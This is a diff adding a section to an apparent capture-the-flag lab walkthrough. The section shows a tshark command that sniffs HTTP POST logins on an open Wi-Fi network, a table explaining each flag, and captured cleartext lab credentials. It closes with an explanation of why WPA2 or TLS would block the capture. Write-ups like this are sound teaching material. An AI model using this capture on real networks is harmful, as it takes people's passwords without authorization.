@@ -723,6 +723,63 @@ A wireless interface normally runs in managed (infrastructure) mode, where the c
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 5.2 Capture cleartext credentials with tshark
+
+**Why this step:** With wlan3 in monitor mode on channel 6 (5.1) and the portal using plain HTTP over an open network, a staff login can be read directly off the air. Filter for HTTP POST form submissions and extract the credential fields.
+
+**Command:**
+
+bash
+
+```bash
+tshark -i wlan3 -a duration:120 \
+  -Y 'http.request.method=="POST"' \
+  -T fields -e frame.time -e wlan.sa -e ip.src -e http.host \
+            -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`tshark -i wlan3`|Capture on the monitor-mode interface, which receives all frames on channel 6.|
+|`-a duration:120`|Auto-stop after 120 seconds so the command returns; re-run with a longer window if no login occurs in that time.|
+|`-Y 'http.request.method=="POST"'`|Display filter limiting output to HTTP POST requests, i.e. form submissions such as logins.|
+|`-T fields`|Output selected fields only, rather than the default packet summary.|
+|`-e frame.time -e wlan.sa -e ip.src -e http.host -e http.request.uri`|Print timestamp, sender MAC, source IP, target host, and request path for context.|
+|`-e urlencoded-form.key -e urlencoded-form.value`|Print the decoded form field names and their values: the username and password.|
+
+**Result:**
+
+```
+Oct  3, 2026 14:31:03 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
+Oct  3, 2026 14:31:43 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
+Oct  3, 2026 14:32:23 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
+3 packets captured
+```
+
+**What this gives you:**
+
+Key findings:
+
+- Cleartext credentials captured: **`jenny` / `Fl1ghtDeck2026!`**, POSTed to `portal.international.htb/miles/login.php` from internal client `10.13.37.132`.
+- The capture repeats on a ~40-second interval, confirming a scripted staff login and validating the channel/filter setup.
+- These credentials belong to the internal portal (Craft CMS) and are reused to authenticate to the Craft control panel for the next phase.
+
+###### Why the credentials were readable (theory):
+
+Two missing protections stack here. The Wi-Fi is an open network, so frames are not encrypted at the link layer, and the portal serves over HTTP rather than HTTPS, so there is no TLS at the application layer either. With neither in place, the POST body travels as plaintext bytes that any monitor-mode radio tuned to the correct channel can read. Adding either WPA2 on the Wi-Fi or TLS on the site would have defeated this capture.
+
+**Next:** Build a network tunnel from Kali through the pivot so Kali's browser and tooling can reach `portal.international.htb` directly, then log into the Craft CMS control panel as jenny.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
